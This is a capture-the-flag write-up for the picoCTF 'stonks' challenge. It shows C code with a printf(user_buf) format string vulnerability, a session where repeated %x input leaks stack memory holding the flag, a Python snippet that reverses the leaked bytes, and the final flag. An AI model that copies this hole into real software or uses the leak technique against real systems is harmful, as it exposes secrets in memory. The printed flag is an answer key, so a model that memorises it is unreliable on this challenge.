
```python
int buy_stonks(Portfolio *p) {

   if (!p) {
       return 1;
   }

   char api_buf[FLAG_BUFFER];
   FILE *f = fopen("api","r");

   if (!f) {
       printf("Flag file not found. Contact an admin.\n");
       exit(1);
   }

   fgets(api_buf, FLAG_BUFFER, f);
   int money = p->money;
   int shares = 0;
   Stonk *temp = NULL;
   printf("Using patented AI algorithms to buy stonks\n");
   while (money > 0) {
       shares = (rand() % money) + 1;
       temp = pick_symbol_with_AI(shares);
       temp->next = p->head;
       p->head = temp;
       money -= shares;
   }
   printf("Stonks chosen\n");

// TODO: Figure out how to read token from file, for now just ask
   char *user_buf = malloc(300 + 1);
   printf("What is your API token?\n");
   scanf("%300s", user_buf);
   printf("Buying stonks with token:\n");
   printf(user_buf);
// TODO: Actually use key to interact with API

   view_portfolio(p);
   return 0;}
```

- In this function, we see that once the buy_stonks function is called, it opens the file called api in read mode, it copies the contents of the file into the api file into the api_buf. api_buf is the size of the FLAG_BUFFER
- We see the user_buf after “what is your API token?\n” is printed out.
- Here, scanf takes in user_buf, and prints out user_buf.
- SInce what there is no specific parameter to be printed out, this is a format string vulnerability.
- So we just need to give a bunch of %x%x%x%x as input and what’s on the stack gets printed out.

```bash
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
88f6350804b00080489c3f7f55d80ffffffff188f4160f7f63110f7f55dc7088f5180388f633088f63506f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3538613032356533ffc9007df7f90af8f7f634402a22210010f7df2ce9f7f640c0f7f555c0f7f55000ffc9a6c8f7de368df7f555c08048ecaffc9a6d40f7f77f09804b000f7f55000f7f55e20ffc9a708f7f7dd50f7f568902a222100f7f55000804b000ffc9a7088048c8688f4160ffc9a6f4ffc9a7088048be9f7f553fc0ffc9a7bcffc9a7b41188f41602a222100ffc9a72000f7d98fa1f7f55000f7f550000f7d98fa11ffc9a7b4ffc9a7bcffc9a74410f7f55000f7f7870af7f900000f7f550000067389cc647681ad6000180486300f7f7dd50f7f78960804b00018048630080486628048b851ffc9a7b48048cd08048d30f7f78960ffc9a7acf7f909401ffc9ae790ffc9aeb2ffc9aebfffc9aec8ffc9aef7ffc9af2fffc9af4affc9af6bffc9af73020
Portfolio as of Wed Jan 10 17:36:31 UTC 2024


3 shares of EZ
8 shares of T
914 shares of HZ
Goodbye!
```

- This gives us a long string with possible hex characters as output
    Putting it in a suitable hex to text converter
    We see this as a part of the data, `ocip{FTC0l_I4_t5m_ll0m_y_y3n58a025e3`

- Now, we see that sets of 4 characters have been reversed,
    Writing a code to reverse 4 characters each,
```python
s='ocip{FTC0l_I4_t5m_ll0m_y_y3n58a025e3'

for x in range(0,len(s),4):
   print(s[x+3]+s[x+2]+s[x+1]+s[x],end='')

```

We get,
`picoCTF{I_l05t_4ll_my_m0n3y_0a853e52`

**FLAG: `picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}`**

